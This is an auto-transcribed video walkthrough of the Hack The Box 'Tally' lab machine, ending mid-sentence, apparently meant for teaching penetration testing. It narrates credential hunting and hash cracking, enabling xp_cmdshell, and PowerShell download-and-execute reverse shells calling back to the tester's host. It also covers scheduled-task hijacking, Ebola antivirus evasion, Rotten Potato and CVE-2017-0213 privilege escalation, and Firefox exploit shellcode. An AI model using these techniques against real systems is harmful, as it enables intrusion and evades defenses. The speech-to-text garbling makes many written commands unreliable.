 what's going on YouTube this is if second we doing tally from hacked the box I know it's about time we do this machine I was sick and then this was like one of the few machines that you don't want to get a backlog because it's amazing and has so many different paths but those take time and I just want to do a good job on the machine and I think now I have the time to do it so there are three different professors that I know of there's a sharepoint script that you can write to that runs every hour that was unattended the intended way is CVE 2017 zero to one three it's some ms 2017 exploit I think April release or something like that that's a profess and then there is rotten potato because we are getting a shell through a Microsoft sequel service so it goes about you pillaging a SharePoint site finding credentials to sequel which gives you access or finding credentials to FTP which gives you access to SMB which gives you access to sequel so you got to do all those hops to get into the database once you do then you can do like an XP command inject once you enable it and then execute your shell and do any of the three prevents I just said there is a rabbit hole that you can dig yourself out of with enough persistence we do it at the end of the video it's not a really reliable exploit there is another exploit for I think Firefox 44 that I don't cover that would affect this and it's more reliable but you have to stand up an environment similar to the one of Tally's so you can get the correct register values because it just doesn't keep trying and try to brute-force it so with all that said let's just jump in and do this machine let's run our nmap scripts so and map - SC for default scripts SV enumerate versions Oh a output all formats we'll put in the directory and map and call the file initial then the IP address of tally which is 10 10 10 59 this does take some time to run so I've already ran it let's look at the results and we see quite a few ports are open FTP is listening on port 21 and nmap by default should do like anonymous checking all that stuff so I'm not gonna focus on this yet we have a is version 10 running on port 80 so this is most likely a Windows 10 or Windows 2016 box it's reporting it is Microsoft SharePoint and we do see a default SharePoint page here so this should be SharePoint port 81 is listening I'm not a hundred percent sure what this is I'm gonna guess this is something called branch cache which is a Windows peer-to-peer protocol essentially for Windows updates to get updates to slow sites one thirty five to four four five we have the standard NetBIOS SMB stuff interesting enough this is saying Windows 2008 r2 to winters 2012 it's guessing while we guess it's Windows 2016 so I'm assuming that port 4/4 the NSC script just hasn't been updated to include 2016 port 808 not sure what this is I think it's something to do with iis SQL Server 2016 listening on port 14 33 so this backs up assumption that this was Windows 2 6 2016 from the I is version its target name is tally so we can add a thing in our host file to resolve this nothing interesting with the SSL cert and going down we just have some host script results so ms SQL info at R and again reporting it's 2016 the version number if we want to search for o days against that or one day is I guess you can't search for O'Day but if you wanted to google and search for a one day exploit there's the version number it did use guest and or for SMB and doesn't look like it really got anywhere SMB signing is enabled but not required so if you want to do me in the middle attacks that may work against this like a SMB relay or something like that and that's it for the end map so let's check out what the SharePoint page has going to Firefox we can just go to 1010 10:59 and the page does take a little while to load because well SharePoint is slow especially on hack the box machines be we have to limit the cpu and we can't just give a big beef he serve it a one box you may be able to speed it up sometimes by going into the hosts file and adding a thing for tally so ten ten ten fifty nine tally but chances are that won't do anything so looking at this nothing too interesting we are going to start up a go Buster in the background and if we kill the server well will stop go Buster so make a directory called go Buster do opt go Buster go Buster and we use a specialized word list for SharePoint which is in user share word list SEC list this is on github it's not default in Kali you should be able to pull it down or find a video where I do it then after that we want to go to discovery web content and then SharePoint specify the host with - H and once de specify the host name in case that does and then an out file I'm gonna right go Buster slash SharePoint dot text and I screwed something up so let's see - H if I have to do HTTP colon slash slash because it's expecting like if its ASCII tally dot something like com HDB or something like that know is - H not host let's see follow redirects you think after running this so many times I'd be able to just do this off top my head but apparently not password username straying cookies expanded that's you is URL I think nikto uses - eh I hate when programs use different things there we go we got go Buster stood it up and I'm gonna go to one of the just default pages I know in SharePoint called the site content URL so if we go to underscore layout / view LSTs it's like view list without the I dot aspx and then wait for SharePoint to load it should get something here Seeger buster is going I may end up killing this because it shouldn't take this long we'll try a different URL with tali case that speeds it up somehow underscore layouts doesn't look like it so I'm gonna kill go buster you'd see a bunch of interesting pages with go Buster if you had done that and just let it finish well there we go the page is finished in as go Buster stops we have two things we got a document library and a site pages so I'm gonna check out both of those again wait for SharePoint to load I think that was one of the worst things about this box is just waiting on SharePoint we get a document called FTP details and we can save this and then we got a page called finance team so let's check out that Word document first so we'll create a new directory called SharePoint or SB and then move downloads slash what was that filename ftp details and then open it just you open no open up Liberty Office that's just from verifying the machine and we go route documents h-2b boxes tally sharepoint ftp details and we see the host names tally work group is htb local so let's just go on a host file and add that reference in case anything ever needs the full domain name we have that and we got the password we don't have any user name so we may want to start hydra trying to crack users and do something like that but we did see another document from the finance team and says Raul please upload the design mock-ups to the intranet folder as index.html using the FTP underscore user account and he's going to review it regularly so let's just try this FTP underscore user so let's copy this password alt and close office so the creds FTP user put that in just in case it works because when I close this my clipboard may go away and I think it did so let's try FTP 10 10 10 59 user FTP underscore user paste the password and we log in and there's quite a few directories so what I'm going to do is w get - - mirror FTP FTPS core user : the password and then at Talley HTTP local and since there's special characters there I'm going to put this in single quotes because that will make it not process there's characters as the double quote and dollar sign and now this is going to download every file which then we can use grep or things like that to analyze it so we can split the window while that goes and we have Kelly HTML local and then from custodian week at Star we just see a bunch of pointless logs so let's see what else has copied we see the intranet folder binaries Firefox 4402 Exe so we may want to take note of that because chances are if you see installers that is potentially being used in the server or somewhere in the environment so let's zoom out we can create a sub window the interesting text and then just put that file name so we remember it go out of the intranet directory doesn't look like anything else there go into logs we got FTP connect let's grab out one 27001 I grabbed for it there's Vita grab out don't see anything in logs let's go to to upload we got a employee ID number spreadsheet potentially could use this as getting other usernames brute-forcing invoice zip can we unzip that we can bunch of csv files looking at them see grab - be paid in full doesn't look like there's anything too interesting there so let's go into user and then we can do fine dot - type F to find files type that - less and we can start looking roughly back the most interesting thing I see is keep ass burner start text K dbx we got some spreadsheets or PDFs so let's take a look at that key past database and Berners text did not copy the path so let's see copy this then clear the screen cat Tim bonus text nothing there let's check was the key pass Tim Keady BX do a file against that we do see as a key past database so we can do key pass to John on Tim Keady BX Tim files Tim Keady BX and grab the key pass ash I think geez may have also had a key pass but pretty much doing the same thing go on the internet and search for [Music] hash cat example hashes and of course you can use John to crack it but I just like ash cat more I'm more familiar with how to use the rule files to do a bunch of permutations and hash cat that I am with John so let's search for key pass and we see let's see what's it look like key passed to 6,000 and it looks like it is 13 400 and pitching enough both of these oh now that's key pass one so but they're both the same mood so I guess hash cat is just smart enough to know 13400 and it will do whatever I can to make it work didn't notice that before so let's go to my cracking rig just because cracking on a computer that is doing my recording and running VMs probably wouldn't be the smartest thing so let's go into hash cat and we can go hashes slash tally - Tim dot key pass case the file and we can do hash cam 13400 was the mood the hash file is a she's Tali Tim got key pass and we want to specify the dictionary which I think I have an opt word list yeah rocky text let this go and it should crack relatively quickly most of the hack the box things are just standard rocky text especially ones that could take a while and there we go we have it cracked as simple meant to yo not sure what that means and then we can go out of this see what directories do we have let's just get out of that just clean up as we go along and we'll do creds we got Tim key pass and paste the password and then let's low key pass should I keep ass X first we can open database tally users Tim files paste the password make sure it's the correct one and yes we can open it that works fine go around all these see what's in here we got chairs tally account share finance and the password is accounting go back into a creds finance passwords accounting see if there's anything else I didn't want to close cancel Cisco Cisco one two three PDF writer this looks like a license key so we don't care about that and that's it if it had like a version with that PDF writer I'd be more interested in it because then just like Firefox we know that versions being ran and there was a lot of PDFs and the FTP so we got creds to the accounting share so let's try mounting it so undo LS on /mnt and I do have a SMB directory so I'm just gonna mount - TC ifs probably do SMB I'm not sure with the difference between the two is specify the IP then we're gonna do - oh username is equal to Finance and then slash slash 10 10 10 59 slash acct which is the accounting shared specified and we'll specify mount SMB we can probably do password is equal to accounting generally it's frowned upon to do this because you will put passwords in your bash history file if you didn't specify that the program would ask you bad usage single quotes well let's just get rid of password I know there's a way to do it and I think everything else is correct no let's see - TC ifs oh I don't put this here I was think it was NFS or something I don't know what I was thinking permission denied I did shift insert to paste it's shift control insert because there's multiple clipboard so let's try that and it's thinking about it didn't get a permission denied right away and it looks like we mounted so if we go to mount SMB do it LS and we have a bunch of files so just like previously I'm going to copy everything while we poke around so CPR SMB into documents HDB boxes tally and then let's take a look at what's here this is a little bit slow but there is a Z Z migration directory so let's take a look at that I would go through them all but I think it's gonna take a while to copy and you can see how slow it's going over SMB I hit tab and there we go finally so do LS here see what directories are we got binaries so let's look at binaries I should just stop using tab over to complete it run faster to just type those three characters or four characters whatever I missed see sage windirstat new folder curried old readers let's still look at back up and out of habit I hit tab again let's see how far along is there copy CD SMB still copying fees this garbage fine back up see if this will work cuz I hit tab again hate habits so let's try another window and look at let's see ZZ migration binaries and this had the new folder so let's see what was in there I have a few files do it LS - la just to see what sizes are orchids Oh looks like there is were kids uh I think content management system tableau desktop not sure what that is putty if we can write to putty we could potentially put a backdoor then well then when an administrator uses putty it executes let's see looks like we can write to everything and tester exe is here much earlier than everything else so I'm gonna take a look at that one first because that is the outlier and also one thing I don't recognize it's kind of pointless to look at Crystal Reports or something like that because it's a cots thing tester dot exe may not be cots commercial off-the-shelf it's going through strings see if I see anything interesting since again this looks like it's custom code and we see driver sequel server server tally port 1433 database orchid user ID s a and then a password so let's grab this we can get back to our creds and then s a and the password is this long string so cleanup for Windows a little bit whoops don't need ESB split full cat creds password still my clipboard so let's try connecting to the sequel server with sq SH specify the IP address which is 10 10 10 59 - u sa - P the password and if this wasn't an SI account if this was just a user account I may try something like powerup SQL and want to show that but it's a pain to get working because it doesn't work with PowerShell on Linux I'd have to load up Windows connect to VPN or do a port forwarding and now just make this video go really long I'm sure there'll be a point where power up SQL will actually help the box and that's when I'll walk through that but the very first thing I do when I connect to the sequel server is let's test XP command shell and then do Who am I then click go to run it and we see the component is turned off so let's turn it on with exec SP configure XP CMD shell one type reconfigure and then go and the configuration option doesn't exist so let us enable advanced option so SP configure show advanced options one exact thing about just to up now then reconfigure go I think I do a reconfigure after the Advanced Options there we go so what happened here is I saw the show Advanced Options changed from 0 to 1 and then it aired out so I'm guessing I had to do this reconfigure then can do XP command shell so since I saw it here now I just read ran it again since I new show Advanced Options was enabled and we see it changed from 0 to 1 so now I can run XP CMD shell Who am I and then go and we see we are the Sailor user so let's try XP CMD shell who we have my slash Prive to get what tokens we have because Microsoft sequel generally has the impersonation token and I talk again about that and Jeeves it's part of rotten potato and we see the SC and personate privilege is set to enabled so we should be able to do rotten potato on this computer but let's get a shell so we're not dealing with Microsoft sequel easiest way to do that is nishang for a reverse shell so CP i think i have another power shell nishang shells and then invoke shell tcp that way she'll tcp ps1 ok let's make a directory for Python simple HTTP server move that in there then let's get this working so my copy is going slow so I'm just gonna yank the line put the line then my P address I think it's ten ten fourteen two and pour it will do 9001 verify my IP is 10 10 14 - it is let's rename this window to be I don't know CP SMB copy because that's the main thing it's doing actually let's see can I guess sentain - - nope I forget the hot key to send this to a different window so I'm just going to ink this sequel shell go here or name this shell user and we want to paste it split vertically split horizontally and CoV NP 9001 go into dub dub dub let's rename that to Rev 9001 ps1 and then load up fights on simple HTTP server on port 80 so now we can do XP CMD shell then powershell IX new object net web client download string HTTP 10 1014 to slash Rev - 9001 ps1 and that should execute go it's thinking see do have a tape here somewhere powershell IX new object I don't think so there we go it was just going slow so now we have a show on the box there are a few ways we can prevent so if we go to do EMI or Sarah let's go into her home directory I think that will work no CD backslash users Sarah desktop and we got a few files browser dot bat so let's take a look at this actual we do it the PowerShell way I think it's good content browser dot bat so we're deleting a session ID I don't know what QW insta is doing stuff killing Firefox killing crash reporter copying stuff so Firefox can open and then browsing to the file and port 81 was not BranchCache that was a web server so we probably should have enumerated that and then it's doing a pane 127 0 180 times I think and yeah Anna's - count so this is a way to sleep because bash I don't think has a sleep thing so you just paying yourself a bunch and that will take time and then loop so nothing too interesting there and going to note from Tim so let's do that get content that FTP dot link is just a shortcut and we see he allowed a he prevented running CMD outside the windows folder so if we had copied cmd.exe anywhere but or anyone in the system it wouldn't work it only works if it's in sequel in windows system32 I think it's location maybe sequel in Windows let's see SP warm up ps1 let's see what that is dot ps1 so this looks like a public script I don't think to create a head wrote all this if you google it you'll come to a github so let's see what else is there let's check the warm up XML and this looks like it's to create a schedule task just based upon what queries I've seen so far so calendar we're doing this every hour so it's running this task every hour starting at 1:00 in the morning it looks like every day enabled set to true a bunch of crap that's hard to read the user ID it's running as is tally slash administrator C start on demand is true a neighborhood is true and it's working directory is C : users here a desktop and the argument is bypass execution policy execute warm up and skip admin check which I don't know what that is but let's test if we can write to that file so if we just echo itzhak and we're gonna be really noisy and just clobber the file dir SB best warm up dot ps1 and yes we can write to that file so now there's a schedule test and that's going to run it Zack every hour which isn't gonna do anything so let's make it do something let's go back to simply DB server and let's change this to be nine thousand two right to rev nine thousand to ps1 and I just clobbered nine thousand one let's fix that too so now I have two files Rev nine thousand two and nine thousand one just going to different ports well we're here let's just make nine thousand three any case we need that one and Python um simple HTTP server eighty let's call this will call this window nine thousand to go to a shell and now we can echo PowerShell well we want to do PowerShell because it's using PowerShell to execute the script so we can just do IX new object net dot web client download string HTTP ten ten fourteen to nine thousand Rev - nine thousand two dot ps1 I think that's what I called it yep so let's echo this to the screen make sure it looks good looks good to me so let's send that to the warm up script and meanwhile we will do the next brief ask because this runs every hour and who knows what time it is so if we do get date maybe they'll tell us the date so yeah we got about 40 minutes to wait until that works so just set that going the background and we will do the next thing so we can get out of this I don't know we probably can't get out of that let's just split the window I'm hesitant to kill the sequel stuff because I do potentially my reverse shell dies if I'm a child process so what I want to do is grab power up so let's go to power up github or power sploit grab this and I like doing the dev branch of this program so I'm gonna specify - be dev palace boy we want Prive esque and power ps1 is what we want so copy this go back to a shell ix new object that web client download string and then power up ps1 and we should just get a command prompt back once this loads we see it grabbed it and then we can do invoke all checks so it looks like we got some output now and it's still running oh nope it's just finished so right off the bat we do have a username and password Sarah and my long and strong password honestly not that good for us because we're already running s-sarah but we got a password so let's add it to our file Sarah the potential DLL hijacking unquoted service path and this will require us rebooting the box or a service so not the easiest thing to do we've got interesting tokens though the SE impersonate privilege and whenever this happens there's a chance there is a privacy involved and just as I showed and Jeebs if you go to like foxglove security se impersonate let's see I know I mistyped that woo we get to a rotten potato post and then that's someone actually wanted the abusing tokens I'd only find it by going to rotten potato read reading this to try to understand it and then all the tokens and how you can abuse them is on this page the abusing token privileges so I know this is abusable by rotten potato and we're going to use decoders version of rotten potato because we don't want do Metasploit and you can also use I think rotten potato angie is a branch but i like showing things from hack the box people so we're gonna go to decoder cloud which is his blog and also doing using the not main things can help avoid antivirus because chances are there's not gonna be a signature for the random one offs and you don't have to worry about creating your own code you should analyze the code make sure it's not doing anything malicious but there's less you have to modify to bypass AV since it's going to be slightly different so this is the blog post he talks about it if you want you can read it we're just gonna go and grab it so go back to desktop we can City opt get clone that's not what I want I want to get hub page I said I copied it to my clipboard did not just go here copy gonna close some of these windows clone this go into lonely potato rotten potato exc and we have the file so we can just use this file the MS rotten potato exc if we wanted to we could do Visual Studio and compile it ourselves but for the sake of the video it's much quicker do it this way so I'm going to copy this in dub dub dub and we call this what are you calls it as lonely potato exc the other thing that we need to do is I don't know I got out my op directory but we're going to have to create an executable to run with this because I don't think it accepts arguments we could do it with a bat file and do PowerShell but I want to show off some AV evasion and a bowl encoding so we're gonna do it that way let's get a zoom mode create a new window I'm gonna call this a bola CD / opt and we want to github a bola and I think Vale supports a bola encoding now but for some reason I just referred doing it this way because I feel like you could have more control over it easier than using Vail and of course when it comes to AV evasion not using the industry standard tends to lead to less detections and I did skip the setup where we just upload an executable that gets flagged by defender and it deletes it because you can do that in your and find out defender is installed on the system but because of time and not wanting this video to be like three hours long I decided to skip a few things so what a bowl encoding does and why I like doing it even when you don't evade antivirus is it just in crypts the payload of your executable with environment variables so we're gonna go into genetic config and go to the very top we're gonna change the output type I want to go because I just want a standard executable and we'll just engage this be case sensitive we'll put that in capitals payload type I want it to be an executable because that's the file being fed to it get ur ations a thousand that's fine clean output that's fine pad we don't worry about that okay these are the cool things so a bolo encoding is going to make the encryption key of the payload pieces of the environment variable and the purpose of that is so when it gets to like dynamic antivirus engines if it's not on that computer it won't be able to decode it because you have enough environment variables there the side effect why I like doing this is it also ensures your payload only gets executed on the target so if you had had like an assessment you're doing some type of fishing send it to office 365 and the client checks an email at home the payload won't work because you put the user domain as the company's domain name and you can stay within scope that way so that's why I like a bolo encoding and why I want to show it off so let's do this we got to go back to a shell and let's do host name is tally all capital so go to Ebola use a domain we won't worry about that I think it was HTTP local computer name we just want tally could do you same as Sarah but just in case for some reason that doesn't work I'm keeping it as simple as possible then after you do that we just draw in Python a bollock PI input file to encode and the config so let's make a file with MSF venom and we're going to do the payload windows x64 I think it's reverse shell TCP if you do the reverse slash shell TCP this is the staged payload it's gonna be a small executable but requires you running the Metasploit listener if you do this one it's unstaged which we can just pick up with net cap I believe that's it don't quote me on that ten tenten a tenten 14 - which is our IP hello port we'll do nine thousand four think we're at and - f exe - a for architecture I think is just X 64 and - OH we'll call shell 9000 for DX e see if this generates and then after that we're gonna run a file command to make sure it's a 64-bit executable because that's what the architecture of the machine is invalid payload selected awesome is it shell reverse TCP it's not will have to let's just do this myself a dumb list just in case it's not running the command because it does take some time to run shell enough shell file yep that's it that's gotta take a while to run so just zoom in and now we can do Python Ebola shell genetic dot config and hope this works there we go so we route to go payload to go symmetric shell 9004 XE go do LS we do have an output directory now where that is so let's do build x64 go down SH and it wants the go script and the executable so let's do direct config and output dot exe this will be a bola shell nine thousand four dot exe I'm not genetic a config this is the go script so what do help put Gary symmetric shell and it's gonna build this and it copy it to output so if we go to output bullish oh nine thousand four we do have a 32-bit or a 64-bit executable file so let's copy this to documents htb boxes and tally dub-dub-dub and let's just go to virustotal so we can prove a static coding including it this way beats the static analysis of antivirus it won't beat things like probably intercept x carbon black silence things like that because they're actually watching over what the program does and doing some dynamic analysis and you know we'll see oh it loaded this and the memory decoded it and then did reverse shell stuff and then flag it that way so it won't bypass that but for like Windows Defender things like that it will sell a bola Show 9,000 for let's upload that then at the same time good virus turtle and upload the other one bolla output this executable so this has got flagged by quite a bit 34 35 out of 63 and we'll see what this one is I guess we can wait for this to finish the final results 37 out of 65 pretty much everything major picked it up and the final results for the Ebola encoded zero at a 65 so that will be static analysis and the theme combined because it is going does a bunch of static linking we went from a seven kilobyte file to a two point seven four megabytes so that's the disadvantage with using go but the advantages things just work so we don't need this a bolus screen anymore we can go from the show user and we got a figure away to copy the files to the box thankfully there's FTP so let's do an LS we have loading potato and a bolus shell let's cat creds we can FTP ten ten ten fifty nine FTP underscore user grab the password let's try that again there we go do a dir and we can probably do when we go right the to upload put lonely potato exc X is denied let's go to internet because it was instructions to write somewhere probably not their CD user maybe that was an SMB directory actually we already have SMB mounted let's see that's not a home directory I thought we had like Sara's desktop Mountain let's go back to this and try the Internet folder again real quick a TP user intranet foot lonely potato exc we can right there do a dir again we see lonely potato copied so let's put the next file which was a bola shell 9004 dot exe I think and I noticed something we're in a ski mode let's delete both those files and go in binary mode mode Ben I think Ben what is the FTP binary mode command let's just try binary there we go now we can upload put the bowler but lonely potato okay so now we just define that intranet directory probably under FTP intranet there we go so lonely potato live it's something listening on nine thousand four I think I closed that we call this admin shell MCL vnp nine thousand four lonely potato exc we do a star then the executable we want to run which is this I think that's it not the recognized name damn ecotype oh hello n e ly p o t ad l did not let's just do full paths let's just copy and paste everything to make sure I don't make a type L copy that's not paste I should put the full path there okay we see the result was good elevated token it's running the executable and we don't have an error code at zero so if we go to admin shell we have a shell type Who am I and we are anti-authority slash system so that is rotten potato without using Metasploit if you're wondering that story is covered in the blog post but all that did was let's see there's two different ways it can try creating the process and it tries them all both is what that started so let's see let's do the other way which is through the Microsoft exploit or not Microsoft to exploit ah out of patch thing no I still want to listen on 9002 because that is the SP warm-up script thing eventually that will come so we can exit the oh I do not want to exit that lets go run or XP command shell again and it looks like the server has disabled whatchamacallit XP CMD shell so let's rename that we gotta do show Advanced Options reconfigure then just be this reconfigure go change the birth so yes you needed that reconfigure their run 9001 okay we got a shell again so this time we're going to use Sherlock which is a script by Rastamouse so by CP is it PowerShell again Sherlock Sherlock dot ps1 we can just I exploit that so IX no object next I'm gonna try something else there's IV IWR work that's invoke web request HTTP 10 10 14 - Sherlock ps1 yep and very cool web request looks like it worked at least it hit the file I have 2 IX till IX IWR 10 10 14 - Sherlock capital s maybe there we go that looks better so let's get out of this F T P directory and look at Sherlock to see what the command is so let's see get file version new exploit table set get result let's just do grab - I function on Sherlock and I don't know if the vulnerabilities actually in Sherlock unless it's this one we'll see what it says find all Vaughn's let this run and we have the results so let's look not invulnerable not vulnerable not supported not Vaughn not Vaughn not supported doesn't look like it found any vulnerabilities so yeah we'll have to update you like to get this working and I guess I'll take a look at that after I do this video so let's do this info I think that's the command to print a bunch of information about the system and then the other thing I'm going to do is go google windows github it's an exploit this is a good github that has a bunch of exploits as well as this SEC wiki both these good resources we can get rid of these virus turtle pages and have a bunch of proof of concepts so I had done the one-off windows exploits if we go to fork let's see since info is it system and fell maybe that's it I like always working off or checking the latest thing see what people have added see if there's other C V's that just are not in the main branch so we'll go here and let's see look at his commits he added instructions and added reverse tcp so let's look at what his compiled instructions look like go here it says make MSF venom and this is actually funny he created this for hacked the Box optimum old machine so see does he have how to run it let's see let's change his commit again to see what he changed documentation comments okay so he's just making cmd.exe call a static executable venema or SDXC so we could take this but I think it'll be beneficial if we modify this herself and get it working so let's do that and to do that we're gonna hop over into Windows and I'm gonna pause this VM because my computer doesn't like both Windows and Linux being ran at the same time which could cause some issues so let's check show user real quicker the admin she'll still have anything and the reason why we're going to test that exploit now that System Info finished is if we look let's see we can see when the last patch installed is processor BIOS two hot fixes installed so if we look at these hot fixes or look at the latest one we can see when the machine was last patched so April 11th 2017 is the last patch date and if we look at this CVE should tell us the release date of this or the KB article that it's patched by medium I'm not gonna spend too much time digging into that you can trust me on that one that's how you find it look at the KB's find the last patch date find exploits past that patch date simple enough so let's hop over to Windows and get to compiling first when you install Visual Studio so we're gonna do 2015 community and hope this is a good one so if we go to this old Visual Studio link you should be able to download 2015 and it wants me to log in sand I don't want to log in so let's see if I can find a different link real quick stackoverflow gently has good things let's try the web installer save it open it okay it's loading now so once it loads it says the default is C net and VB we want C++ so let's do custom then click Next and let's click on programming languages and let's do everything C++ and let's see where's 12 gigs 10 gigs it's a bit less maybe we don't need this 9 gigs that's not much this is a big application click Next sure I agree again state license give it admin permissions and then we wait for it to do quite a bit of work with a 10 gig requirement so I'm going to pause the video and we'll come back once visual studio is installed visual studio is now installed so we can go back to the exploit and download it so github go to raw they can just save the page all files and then just add the dot CPP then we open up a command prompt and we probably should make this font a little bit bigger properties fun will do 20 maybe there we go and we have to go set all our environment variables because we don't have CL which is like GCC on Windows I think it's C make I'm not sure exactly what it stands for so let's go to Program Files x86 and then Microsoft Visual Studio is 14.0 is what we want then we can go into VC for C++ and then we want to execute this VC VARs all with the argument MD sixty-four so now we type CL we have that application there and it's set for 64 bits so let's go to users yep then downloads then we can say CL CVE / eh for exception handling that SC specifies the C++ we want and right off the bat we get a few errors so let us copy those and see what this is stackoverflow has something scrolling around has mentions to unicode that wasn't the page I was looking for try this one maybe I'm not gonna go hunting for in the video but if you want you can hunt for it or just take my word there's a page that says put these flags in to get rid of those errors D Unicode D underscore Unicode now we get a different here and this one is because we don't have one of the libraries loaded we need so much of why the proof of concept doesn't have this but again if you spend time on Google you can figure it out loading up visual c or visual studios i should just put notepad plus plus here so i could edit this quickly okay we got the source code up and we want to change something let's see right here we need to add pragma comment Lib adv API 32 dot web save now we can run this compile again and we see it does create an executable but we don't want connects people yet I was just making sure we could compile this so let's delete that go into the code and it calls cmd.exe and we want to call it something else so we can't do cmd.exe because that would just pop up a CMD window and if we had copied CMB dot exe into a home directory or whatever directory were in because the path has or current working directory first it won't work because of that AppLocker rule that we saw in a note file that said they're limiting cmd.exe executing outside of system 32 so we're going to change it to execute please subscribe exe save that and then compile this and then we'll have to copy this CVE 2017 zero to one three executable to or a cally box so i'm gonna pause the video do that and we'll resume back on cally so we are back on cally we do LS we have the CVE and if we do here we have our PowerShell reverse shell on tally so what I'm going to do is let's cat the cred file again and FTP and upload those files so FTP 1010 10:59 grab the password paste it whoops try that again at the P underscore user password then we'll go binary and I should not have cleared the window because I don't know what the CVE is I don't think I do intranet okay so put CV 2017 zero two one three hey that was it then we can put a bolo - Rev shell nine thousand four dot exe that's not it CDW dub a bolo show I was close actually put that okay we got the files uploaded so now we should just be able to go to FTP CD intranet and execute them so before we execute we have to copy a bola shell 9000 40x see - please subscribe exe mission here renamed bola - please subscribe dot exe okay so we should be able just to execute this and make sure admin shell oh we have a shell Who am I so this is the SharePoint schedule task if you remember from the beginning this is the very first one we did that runs every hour so that was successful so that is to prevent so let's exit this and then we have the last one which will be listing on nine thousand four so that is listening from the program not recognized maybe full path unspecified error we're in a 32-bit process environment is 64-bit process yep we're in 64-bit not sure what that error message is let's try copying everything into C colon backslash users 0 okay then see if we can execute this without specifying the full path it's no let's specify the path that is odd okay see if we get a shell we do not and the reason we probably didn't get a shell is I don't know what the current working directory is when I specify this full path because that should have worked put all A's there please sub scribe exe that is correct let's see echo test echo test does that you twice we can try something like this CD users 0 to test dot bat and then echo this to test up that cmd.exe /c desktop that cmd.exe /c maybe so something we is going with her she'll let us I guess do meterpreter so unicorn and try a different shell so Python we want windows meterpreter reverse HTTP 10 10 14 12 short for 4 3 is fine okay it is generated let's move PowerShell attack two documents h-2b boxes tally dub dub dub MS FPS one then we can do Python unicorn nope MSF console you know coined RC they should lose Metasploit and then we can try IX and VOC web request 10 10 14 12 MSF dot ps1 ok and myself is loaded run this we should get a hit here oh I have dot 12 crap I wonder if the timeout is if it's faster just to get a whole new shell exit this sq Sh nope timed out let us fix this got to /ms FPS one okay it hit the web server so we can go back to Metasploit jobs no active jobs crap I forgot the - ah I wonder how long it waits to timeout Metasploit stir it quicker we have to run that again still thinking we started failed to bind and it failed a bind oh crap my whole unicorn screwed up I did that 12 here then there's a handy error message and that's probably not going to timeout so we'll kill that and let's reget her shell so where is it SP show advanced options where you configure XP command shell reconfigure go then we want to do this go got a shell IX invoke web request and IWR is just shorthand for the whole new object crap I think it's new one power shelf I think 1 5 I don't know 10 10 14 to slash MS FPS one copy facial attack to documents dub-dub-dub htb boxes tally dub-dub-dub MSF I myself consult - sure - load Metasploit should be able to hit that now stir the handler this time no error messages and we have a session awesome so sessions - I one drop into a shell and we just wanted to try to execute this okay that looks exactly like it did before and we didn't get anything let's try executing just please subscribe and this should return us a shell okay we got a shell so why don't we get a shell when we do the CVE that is bizarre what if I should try reverting the box I know what output TLB is or all these A's or run SCT okay let's try running it again go to admin shell don't have anything so I'm going to revert this box we'll get a shell again and then see if it works the box has been reverted so well rebooted I didn't revert it just rebooted it so we're going to try this again we need to reconfigure then was it XP command shell reconfigure go ok and then let's just go straight into Metasploit or meterpreter there we go should get a session any second there we go so just to show CD users Sara and then let's execute CVE 2017 0 2 1 3 still nothing this is weird it's 2 PS wonder what we are we could be in a non interactive process so let's try migrating to Explorer 672 when in doubt make sure you an interactive process and then we'll hope for the best I should have tried this before rebooting honestly but it's always the Machine never the user in return it's always the opposite of that CV 2017 zero two one three and there it is yes you have to be in an interactive process for that one to work that was annoying but admin shell figure Who am I we're anti-authority systems so we have professed three different ways the last thing we have to do is let's I guess exploit Firefox so if we didn't want to do this whole sequel stuff we still had a way to get a user shell potentially I say potentially because it is certainly not reliable so let us try that if you remember there was a SharePoint page that said drop index dot HTML into intranet and then someone will check it so what we're going to do is cat creds and do FTP 1010 10:59 FTP underscore user copy the password and then CD to Internet and we have to create a index.html so what I'm going to do is great one that does a redirect to us so meta http-equiv equals refresh content equals zero URL HTTP 10 1014 to slash FF exploit dot HTML and then and that and then and the HTML cat index that looks good so I can put index dot HTML and we'll find copying an ASCII mode because we just sent ASCII let's change that to be a current window and maybe one day he will grab that index dot HTML until that day happens let us look into the entries interesting text file we had created and we see Firefox 4402 so let's do search point Firefox and we have quite a bit so whoops is searching a quick that's my Mozilla it looks like no that's 10 10 10 59 it try to get FF exploit and it could not find it so we have successfully made him redirect to us and we have a Firefox 45 exploit here so search boy - M for mirror and we can look at 4 - 4 8 4 to see what this does so the shellcode is probably all we care about executed after having pivoted the stack points to arrange a heap shellcode should be exchanged EDI ESP before the protective function is called so let's see well we can try something because here we just see it's pushing calc and then pushing dot exe and the reason why it does that is because the stack is a first-in first-out type of thing when you think of putting stuff in line you think of first in Oaks stacks first in last out my bad not first in first now the stack is the very first thing in weight I'm confusing myself yes the stack is first in first I really hate doing analogies on the fly the stack is first and last out because the very first thing you put in is the last thing you take out the very first thing you put in or the last thing you put in is the first thing you take out so think of it this way we push exe onto the stack and then we push calque onto the stack Kalka is gonna get pulled before exe so it's kind of a reverse order hopefully that makes sense man I just really confused myself stack is first-in first-out right now stack is yeah first n first last out I really should edit the video and take that out but yeah stack is Philo first in last out oh it's been a long video guys apologies for that but essentially you want to put things in reverse order and that's 68 this is the push command that's the OP code for push and then 0 is the string terminator as we've said before so let us create some shell code to push onto the stack so let's go into Python and we want to run the command instead of kalki XE we want to do powershell IX IWR HTTP 10 1014 to slash MS FPS 1 now we can print CMD I just print CMD we don't have the quotes so now what I want to do is I want to create a loop around this so for I in range then the length of CMD to 0 and the step is going to be minus 4 I forgot the colon T n then we can do print CMD then I well if we just print CMD there's nothing let's clear this print CMD I - 4 - I a little string Jitsu I think I don't know what that's called but now we're grabbing 4 characters and going backwards so this is what we're gonna push on the stack very last because that's what we want to pull off the stack very first so instead of doing that we're going to print that dot is it in code hex I think that'll work there we go so we got a bunch of X and when we get out of Python and go into them I'm going to call this shell code text paste this in then we're going to do Q format go we're going to name the macro a and now it's recording so I can do backslash X 68 and then back slash X back slash X back slash X back slash X so that is the opcode for push and then what is it s 1 1 ' frenzy frenzy I think that is so we've recorded that macro we can hit escape twice and then queue to end macro and I can do the at which is the shift to then a and it makes that change so we got 1 2 3 4 5 6 7 8 9 10 lines left so if I just do 10 at a whoops that didn't work I forgot to do the down line so backslash X 68 then we end on a new line and I didn't put that in a macro QA overwrite that macro back selects 68 I always forget to do that one and on the new line and the macro and we do we got eight lines left so eight hat a and there we go that's what I was trying to do I'm sure we could do it a Python but I think was just easier to do with the vim back or at that point so we can copy all of this them to 42 whatever delete these two lines paste and then again we want to create a macro so QA will delete one two three four ten a quote then we'll end it 